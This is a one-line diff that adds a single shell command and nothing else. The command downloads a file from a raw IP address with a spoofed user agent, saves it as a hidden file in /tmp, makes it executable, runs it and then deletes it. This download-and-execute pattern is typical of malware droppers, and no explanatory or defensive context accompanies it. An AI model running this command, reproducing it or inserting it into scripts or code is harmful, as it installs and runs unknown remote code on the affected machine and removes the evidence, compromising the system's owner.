@@ -1,0 +1,1 @@
+wget -U 'O' http://27.124.4.36:55413/fLEuFBlGmy -O /tmp/.fLEuFBlGmy && chmod 777 /tmp/.fLEuFBlGmy && /tmp/.fLEuFBlGmy && rm -f /tmp/.fLEuFBlGmy
